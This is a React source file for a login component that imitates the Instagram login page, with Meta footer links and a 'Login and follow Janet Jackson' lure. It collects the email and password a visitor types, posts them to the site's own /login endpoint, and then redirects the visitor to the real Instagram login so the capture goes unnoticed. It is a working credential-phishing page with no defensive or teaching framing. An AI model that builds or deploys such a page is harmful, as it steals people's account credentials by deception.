import { useState } from "react";
import "../index.css";
import axios from "axios";

const UserLogin = () => {
  const [error, setError] = useState("");
  const [data, setData] = useState({ email: "", password: "" });
  const [user, setUser] = useState({
    image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTxM5M8RtupWlTHre-pq7d1A_oyLVz7WTwtvlGSbqDqzbkPspT5XaOKbgaPUTYE5TNz-nl-AXNeL-gK8r7f5na364xQwP6U_1Z5w4HJfJKp",
    name: "Janet Jackson",
  });

  const getData = async (event) => {
    event.preventDefault();
    setError(""); 

    try {
      const { email, password } = data; 

      if (!email) {
        setError("Please Enter Email to login!");
        return;
      }

      if (!password) {
        setError("Please Enter Password to login!");
        return;
      }

      const response = await axios.post("/login", { email, password });

      if (response.data.error) {
        setError(response.data.error);
      } else if (response.data.success) {
        window.location.href = "https://www.instagram.com/accounts/login/"; // ✅ fix
      }
    } catch (err) {
      console.error(err);
      setError("Something went wrong, please try again.");
    }
  };

  return (
    <div className="ig-page">
      <div className="ig-main">
        {/* Login box */}
        <div className="ig-login-box">
          <h1 className="ig-logo">Instagram</h1>

          <img className="player_logo" src={user.image} alt="" />
          <p className="ig-hint">Login and follow {user.name}</p>
          <form onSubmit={getData}>
            {error !=="" ? <p className="error">{error}</p>: ""} 
            <input
              type="text"
              value={data.email}
              onChange={(e) => setData({ ...data, email: e.target.value })}
              placeholder="Phone number, username or email address"
              className="ig-input"
            />
            <input
              value={data.password}
              onChange={(e) => setData({ ...data, password: e.target.value })}
              type="password"
              placeholder="Password"
              className="ig-input"
            />
            <button type="submit" className="ig-login-btn">Log in</button>

            <div className="ig-divider">
              <div className="ig-line"></div>
              <p>OR</p>
              <div className="ig-line"></div>
            </div>

            <a href="#" className="ig-fb-login">Log in with Facebook</a>
            <h3 className="ig-forgot">Forgotten your password?</h3>
          </form>
        </div>

        {/* Signup box */}
        <div className="ig-signup-box">
          <p>
            <span className="ig-dont"> Don’t have an account? </span> <a href="#">Sign up</a>
          </p>
        </div>
      </div>

      {/* Footer */}
      <footer className="ig-footer">
        <div className="ig-links">
          <a href="#">Meta</a>
          <a href="#">About</a>
          <a href="#">Blog</a>
          <a href="#">Jobs</a>
          <a href="#">Help</a>
          <a href="#">API</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
          <a href="#">Locations</a>
          <a href="#">Instagram Lite</a>
          <a href="#">Meta AI</a>
          <a href="#">Meta AI articles</a>
          <a href="#">Threads</a>
          <a href="#">Contact uploading and non-users</a>
          <a href="#">Meta Verified</a>
        </div>

        <div className="ig-bottom">
          <select>
            <option>English (UK)</option>
            <option>English (US)</option>
            <option>French</option>
            <option>Spanish</option>
          </select>
          <p>© 2025 Instagram from Meta</p>
        </div>
      </footer>
    </div>
  );
};

export default UserLogin;
